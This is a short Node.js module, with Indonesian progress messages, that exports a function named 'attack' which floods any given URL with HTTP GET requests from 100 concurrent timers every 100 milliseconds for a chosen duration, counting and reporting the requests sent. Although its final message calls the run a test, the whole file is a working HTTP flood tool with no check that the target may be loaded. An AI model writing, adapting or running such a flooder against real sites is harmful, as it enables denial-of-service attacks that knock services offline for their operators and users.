const axios = require('axios');

function attack(url, duration, callback) {
  let count = 0;
  const threads = 100;
  const delay = 100;
  const end = Date.now() + duration * 1000;

  const progress = setInterval(() => {
    callback(`⏳ Progress: ${count} request terkirim...`);
  }, 5000);

  for (let i = 0; i < threads; i++) {
    const interval = setInterval(async () => {
      if (Date.now() > end) {
        clearInterval(interval);
        return;
      }
      try {
        await axios.get(url);
        count++;
      } catch {}
    }, delay);
  }

  setTimeout(() => {
    clearInterval(progress);
    callback(`✅ Pengujian selesai! Total request terkirim: ${count}`);
  }, duration * 1000 + 500);
}

module.exports = { attack };